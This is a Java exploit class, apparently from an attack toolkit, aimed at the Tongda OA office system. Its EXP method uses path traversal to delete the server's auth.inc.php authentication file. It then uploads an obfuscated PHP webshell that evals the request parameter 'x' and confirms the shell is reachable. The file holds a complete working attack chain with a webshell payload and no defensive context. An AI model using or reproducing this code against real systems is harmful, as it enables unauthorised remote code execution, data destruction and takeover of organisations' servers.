package poc;

import com.github.kevinsawicki.http.HttpRequest;

public class TongdaOA_DeleteAuth {
    private String url;//通达url
    private String path;//漏洞目录
    private String fileName;//文件名
    private String parame="<?php class Gpl5I2Tc { public function __construct($H9i75){ @eval(\"/*Zc3W78jv53*/\".$H9i75.\"/*Zc3W78jv53*/\"); }}new Gpl5I2Tc($_REQUEST['x']);?>";//webshell

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getFileName() {
        return fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getParame() {
        return parame;
    }

    public void setParame(String parame) {
        this.parame = parame;
    }


    //POC
    public boolean POC(){
        //判断print.php文件是否存在
        path = "/module/appbuilder/assets/print.php";
        HttpRequest request = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts();
        if (request.code()==200){
            return true;
        }else {
            return false;
        }
    }

    //EXP
    public boolean EXP(){
        //删除auth.inc.php文件
        path="/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php";
        HttpRequest request = HttpRequest.get(url + path)
                .trustAllHosts()
                .trustAllCerts();
        if (request.code()==200){
            //上传webshell
            path="/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./";
            HttpRequest fileRequest = HttpRequest.post(url + path)
                    .trustAllCerts()
                    .trustAllHosts()
                    .part("FILE1", "shell.php", parame);
            fileRequest.code();
            HttpRequest verifyFile =HttpRequest.get(url+"/_shell.php")
                    .trustAllCerts()
                    .trustAllHosts();
            if (verifyFile.code()==200){
                path="/_shell.php";
                return true;
            }else {
                return false;
            }
        }else {
            return false;
        }
    }

}
